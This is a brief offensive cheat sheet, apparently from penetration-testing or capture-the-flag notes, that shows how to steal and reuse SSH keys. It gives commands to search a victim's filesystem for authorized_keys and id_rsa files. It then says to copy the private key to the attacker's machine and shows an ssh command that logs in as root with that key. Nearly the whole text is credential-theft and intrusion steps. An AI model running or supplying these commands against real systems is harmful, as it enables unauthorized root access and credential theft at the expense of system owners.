#### Find Authorized Keys
**Victim's Machine**
```
find / -name authorized_keys 2>/dev/null
```

#### Find `id_rsa`
**Victim's Machine**
```
find / -name id_rsa 2>/dev/null
```

Copy the contents of the discovered `id_rsa` file to local machine:

#### SSH to Victim
**Attacker's Machine**
```
chmod 400 id_rsa
ssh -i id_rsa root@IP
```
